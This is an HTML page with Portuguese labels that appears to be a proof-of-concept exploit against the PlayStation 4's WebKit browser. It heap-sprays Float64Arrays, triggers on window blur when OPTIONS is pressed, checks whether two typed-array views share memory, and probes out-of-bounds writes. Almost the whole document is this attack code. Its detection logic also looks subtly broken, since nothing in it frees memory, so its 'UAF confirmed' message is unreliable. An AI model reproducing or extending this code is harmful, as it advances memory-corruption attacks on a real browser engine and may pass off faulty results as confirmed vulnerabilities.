
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF Auditoria (Setup Corrigido)277777</title>

</head>

<body>

<h2>PS4 WebKit – Auditor</h2>

<button onclick="setup()">SETUP (Pressione OPTIONS 2x)</button>
<button onclick="audit()">AUDITORIA</button>

<pre id="log"></pre>

<script>
let arrays = [];
let first = null;
let second = null;
let trigger = 0;

const log = m => document.getElementById("log").textContent += m + "\n";

function setup() {
    log("== SETUP INICIADO ==");
    arrays = [];
    first = null;
    second = null;
    trigger = 0;

    for (let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }

    if (document.documentElement.webkitRequestFullscreen)
        document.documentElement.webkitRequestFullscreen();

    window.onblur = () => {
        trigger++;
        log("Trigger OPTIONS #" + trigger);

        let spray = [];
        for (let i = 0; i < 8000; i++) {
            spray.push(new Float64Array(8));
        }

        let corrupted = [];
        for (let a of arrays) {
            if (a[0] !== arrays.indexOf(a)) {
                corrupted.push(a);
            }
        }

        if (corrupted.length === 0) {
            log("Nenhuma view afetada");
            return;
        }

        if (trigger === 1) {
            first = corrupted[0];
            log("Primeira view capturada");
            log("Pressione OPTIONS novamente");
        }

        if (trigger === 2) {
            second = corrupted[0];
            log("Segunda view capturada");

            // PROVA REAL
            first[4] = 42.4242;
            if (second[4] === 42.4242) {
                log(">>> UAF REAL CONFIRMADO (backing store compartilhado)");
            } else {
                log("Views não compartilham memória");
            }
        }
    };
}

function audit() {
    log("\n== AUDITORIA DE LIMITES ==");
    if (!first || !second) {
        log("ERRO: UAF não confirmado");
        return;
    }

    log("Length first = " + first.length);
    log("Length second = " + second.length);

    try {
        first[9] = 13.37;
        log("first[9] = " + first[9]);
    } catch (e) {
        log("Exceção ao escrever fora do limite");
    }

    try {
        let s = first.subarray(0, 32);
        log("subarray length = " + s.length);
    } catch (e) {
        log("Exceção em subarray()");
    }

    let count = 0;
    for (let v of first) count++;
    log("Iteração contou " + count + " elementos");
}
</script>

</body>
</html>
